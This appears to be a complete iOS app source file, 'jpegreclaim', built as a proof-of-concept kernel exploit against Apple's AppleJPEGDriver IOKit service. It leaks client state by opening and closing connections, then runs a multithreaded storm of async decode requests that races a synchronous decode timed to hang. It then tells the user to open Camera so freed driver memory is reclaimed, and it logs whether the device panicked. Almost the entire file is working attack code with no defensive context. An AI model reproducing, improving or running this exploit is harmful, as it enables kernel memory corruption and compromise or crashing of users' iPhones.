#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <mach/mach.h>
#import <unistd.h>
#import <stdarg.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>

typedef mach_port_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;
typedef io_object_t io_iterator_t;

extern const mach_port_t kIOMainPortDefault;
kern_return_t IOServiceGetMatchingServices(mach_port_t mainPort, CFDictionaryRef matching, io_iterator_t *existing);
io_object_t IOIteratorNext(io_iterator_t iterator);
kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type, io_connect_t *connect);
kern_return_t IOServiceClose(io_connect_t connect);
kern_return_t IOObjectRelease(io_object_t object);
kern_return_t IOConnectCallStructMethod(io_connect_t connect, uint32_t selector,
    const void *inputStruct, size_t inputStructCnt,
    void *outputStruct, size_t *outputStructCnt);
CFMutableDictionaryRef IOServiceMatching(const char *name);

typedef struct __attribute__((packed)) {
    uint32_t sourceID;
    uint32_t field_04;
    uint32_t destID;
    uint32_t field_0C;
    uint32_t field_10;
    uint32_t width;
    uint32_t height;
    uint32_t field_1C;
    uint8_t  flags;
    uint8_t  pad_21[3];
    uint32_t xOffset;
    uint32_t yOffset;
    uint32_t subsampling;
    uint64_t asyncToken;
    uint64_t asyncToken2;
    uint64_t field_40;
    uint32_t codecID;
    uint32_t outWidth;
    uint32_t outHeight;
    uint32_t field_54;
} AppleJPEGDriverIOStruct;

_Static_assert(sizeof(AppleJPEGDriverIOStruct) == 0x58, "struct size");

static UITextView *gLog = nil;
static UIViewController *gVC = nil;
static volatile int gStop = 0;
static NSLock *gLogLock = nil;
static UIBackgroundTaskIdentifier gBG = 0;

static NSString *docsPath(void) {
    return [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
}
static NSString *logPath(void) {
    return [docsPath() stringByAppendingPathComponent:@"jpegreclaim.log"];
}
static void appendLog(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[jpegreclaim] %@", s);
    static dispatch_once_t once;
    dispatch_once(&once, ^{ gLogLock = [NSLock new]; });
    [gLogLock lock];
    NSString *path = logPath();
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:path]) {
        [fm createFileAtPath:path contents:nil attributes:nil];
    }
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (fh) {
        @try {
            [fh seekToEndOfFile];
            [fh writeData:[[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
            [fh synchronizeFile];
        } @finally {
            [fh closeFile];
        }
    }
    [gLogLock unlock];
    if (gLog) {
        dispatch_async(dispatch_get_main_queue(), ^{
            gLog.text = [gLog.text stringByAppendingFormat:@"%@\n", s];
            NSRange r = NSMakeRange(gLog.text.length, 0);
            [gLog scrollRangeToVisible:r];
        });
    }
}

static io_service_t findJPEGService(void) {
    CFMutableDictionaryRef matching = IOServiceMatching("AppleJPEGDriver");
    if (!matching) return 0;
    io_iterator_t iter = 0;
    kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault, matching, &iter);
    if (kr != KERN_SUCCESS || !iter) return 0;
    io_service_t svc = IOIteratorNext(iter);
    IOObjectRelease(iter);
    return svc;
}

static NSData *makeJPEG(uint32_t w, uint32_t h) {
    UIGraphicsBeginImageContext(CGSizeMake(w, h));
    [[UIColor redColor] setFill];
    UIRectFill(CGRectMake(0, 0, w, h));
    [[UIColor blueColor] setFill];
    UIRectFill(CGRectMake(0, 0, w / 2, h / 2));
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return UIImageJPEGRepresentation(img, 0.9);
}

static IOSurfaceRef makeSourceSurface(NSData *jpegData) {
    size_t len = jpegData.length;
    size_t allocLen = (len + 0x3FFF) & ~0x3FFFUL;
    NSDictionary *props = @{
        (id)kIOSurfaceWidth: @(allocLen),
        (id)kIOSurfaceHeight: @1,
        (id)kIOSurfaceBytesPerElement: @1,
        (id)kIOSurfacePixelFormat: @0x20202020,
    };
    IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (!surf) return NULL;
    IOSurfaceLock(surf, 0, NULL);
    void *base = IOSurfaceGetBaseAddress(surf);
    memcpy(base, jpegData.bytes, jpegData.length);
    IOSurfaceUnlock(surf, 0, NULL);
    return surf;
}

static IOSurfaceRef makeDestSurface(uint32_t w, uint32_t h) {
    NSDictionary *props = @{
        (id)kIOSurfaceWidth: @(w),
        (id)kIOSurfaceHeight: @(h),
        (id)kIOSurfaceBytesPerElement: @4,
        (id)kIOSurfacePixelFormat: @0x42475241,
    };
    return IOSurfaceCreate((__bridge CFDictionaryRef)props);
}

static void fillInput(AppleJPEGDriverIOStruct *in, uint32_t srcID, uint32_t dstID,
                      uint32_t w, uint32_t h, uint8_t flags, uint64_t token) {
    memset(in, 0, sizeof(*in));
    in->sourceID = srcID;
    in->field_04 = w * h;
    in->destID = dstID;
    in->field_0C = w * h * 4;
    in->width = w;
    in->height = h;
    in->outWidth = w;
    in->outHeight = h;
    in->subsampling = 3;
    in->flags = flags;
    in->asyncToken = token;
}

static int submitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                       uint32_t w, uint32_t h, int count, uint64_t tokenBase,
                       uint8_t flags) {
    int submitted = 0;
    for (int j = 0; j < count && !gStop; j++) {
        AppleJPEGDriverIOStruct input;
        AppleJPEGDriverIOStruct output = {0};
        fillInput(&input, srcID, dstID, w, h, flags, tokenBase + j);
        size_t outSize = sizeof(output);
        kern_return_t kr = IOConnectCallStructMethod(conn, 1, &input, sizeof(input), &output, &outSize);
        if (kr != KERN_SUCCESS) break;
        submitted++;
    }
    return submitted;
}

static void beginBackgroundTask(void) {
    dispatch_async(dispatch_get_main_queue(), ^{
        gBG = [[UIApplication sharedApplication] beginBackgroundTaskWithName:@"jpegreclaim" expirationHandler:^{
            appendLog(@"background task expired");
            if (gBG != 0 && gBG != UIBackgroundTaskInvalid) {
                [[UIApplication sharedApplication] endBackgroundTask:gBG];
                gBG = 0;
            }
        }];
        appendLog(@"background task id=%lu", (unsigned long)gBG);
    });
}

static void showCameraPrompt(void) {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSURL *cameraURL = [NSURL URLWithString:@"camera://"];
        [[UIApplication sharedApplication] openURL:cameraURL options:@{} completionHandler:^(BOOL ok) {
            appendLog(@"camera:// opened=%d", ok);
        }];
        UIAlertController *a = [UIAlertController alertControllerWithTitle:@"OPEN CAMERA NOW"
            message:@"Reclaim race done. Open Camera now and wait 15 seconds."
            preferredStyle:UIAlertControllerStyleAlert];
        [a addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
        if (gVC) [gVC presentViewController:a animated:YES completion:nil];
    });
}

static void reclaimAll(void) {
    appendLog(@"build=jpegreclaim pid=%d", getpid());

    io_service_t svc = findJPEGService();
    if (!svc) { appendLog(@"service not found"); return; }
    appendLog(@"service=%#x", svc);

    const uint32_t W = 2048, H = 2048;
    NSData *jpegData = makeJPEG(W, H);
    IOSurfaceRef src = makeSourceSurface(jpegData);
    IOSurfaceRef dst = makeDestSurface(W, H);
    appendLog(@"jpeg=%lu src=%p dst=%p", (unsigned long)jpegData.length, src, dst);
    if (!src || !dst) {
        if (src) CFRelease(src);
        if (dst) CFRelease(dst);
        IOObjectRelease(svc);
        return;
    }
    uint32_t srcID = IOSurfaceGetID(src);
    uint32_t dstID = IOSurfaceGetID(dst);
    appendLog(@"srcID=%u dstID=%u", srcID, dstID);

    /* Phase 1: small prime, enough to leak the client state. */
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    appendLog(@"prime open kr=%#x conn=%#x", kr, conn);
    if (kr == KERN_SUCCESS && conn) {
        int n = submitAsync(conn, srcID, dstID, W, H, 5, 0x11110000, 0);
        appendLog(@"prime submitted=%d", n);
        IOServiceClose(conn);
        appendLog(@"prime closed");
    }
    usleep(300000);

    /* Phase 2: reclaimer storm runs while the sync decode hangs. */
    const int RTHREADS = 4;
    __block int32_t rConn = 0, rReq = 0, rFail = 0;
    appendLog(@"reclaimer start threads=%d", RTHREADS);
    dispatch_group_t rgroup = dispatch_group_create();
    for (int t = 0; t < RTHREADS; t++) {
        dispatch_group_async(rgroup, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            while (!gStop) {
                io_connect_t c = 0;
                kern_return_t opr = IOServiceOpen(svc, mach_task_self(), 0, &c);
                if (opr != KERN_SUCCESS || !c) {
                    __sync_fetch_and_add(&rFail, 1);
                    usleep(1000);
                    continue;
                }
                int n = submitAsync(c, srcID, dstID, W, H, 5,
                                    0x41410000 + (t << 12) + (rConn & 0xfff), 1);
                __sync_fetch_and_add(&rReq, n);
                __sync_fetch_and_add(&rConn, 1);
                usleep(20000); /* keep requests in flight */
                IOServiceClose(c);
            }
        });
    }

    usleep(100000);

    /* Phase 3: sync decode on a separate connection. Expect kIOReturnTimeout. */
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        for (int round = 0; round < 3 && !gStop; round++) {
            io_connect_t c = 0;
            kern_return_t opr = IOServiceOpen(svc, mach_task_self(), 0, &c);
            if (opr != KERN_SUCCESS || !c) {
                appendLog(@"sync round=%d open kr=%#x", round, opr);
                usleep(200000);
                continue;
            }
            AppleJPEGDriverIOStruct input;
            AppleJPEGDriverIOStruct output = {0};
            /* token = 0 => synchronous decode; the driver waits for completion
               and returns kIOReturnTimeout (0xe00002d6) if the codec is stuck. */
            fillInput(&input, srcID, dstID, W, H, 0, 0);
            size_t outSize = sizeof(output);
            CFTimeInterval t0 = CFAbsoluteTimeGetCurrent();
            kern_return_t sr = IOConnectCallStructMethod(c, 1, &input, sizeof(input), &output, &outSize);
            CFTimeInterval dt = CFAbsoluteTimeGetCurrent() - t0;
            appendLog(@"sync round=%d kr=%#x dt=%.3fs outSize=%zu", round, sr, dt, outSize);
            IOServiceClose(c);
        }
        appendLog(@"sync trigger done");
    });

    /* Give the sync trigger time to hit the 10s timeout, then keep the
       reclaimer alive while the user opens Camera. The background task gives
       us ~30s of execution after the app is backgrounded. */
    sleep(45);
    appendLog(@"sync window done; keeping reclaimer alive for Camera");
    beginBackgroundTask();
    showCameraPrompt();

    sleep(60);
    gStop = 1;
    dispatch_group_wait(rgroup, dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC));
    appendLog(@"reclaimer stop conn=%d req=%d fail=%d", rConn, rReq, rFail);
    if (gBG != 0 && gBG != UIBackgroundTaskInvalid) {
        [[UIApplication sharedApplication] endBackgroundTask:gBG];
        gBG = 0;
    }
    CFRelease(src);
    CFRelease(dst);
    IOObjectRelease(svc);
    appendLog(@"jpegreclaim done (no panic)");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UITextView *textView;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = [UIColor blackColor];

    self.textView = [[UITextView alloc] initWithFrame:vc.view.bounds];
    self.textView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    self.textView.backgroundColor = [UIColor blackColor];
    self.textView.textColor = [UIColor greenColor];
    self.textView.font = [UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightRegular];
    self.textView.editable = NO;
    [vc.view addSubview:self.textView];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    gLog = self.textView;
    gVC = vc;
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        reclaimAll();
    });
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
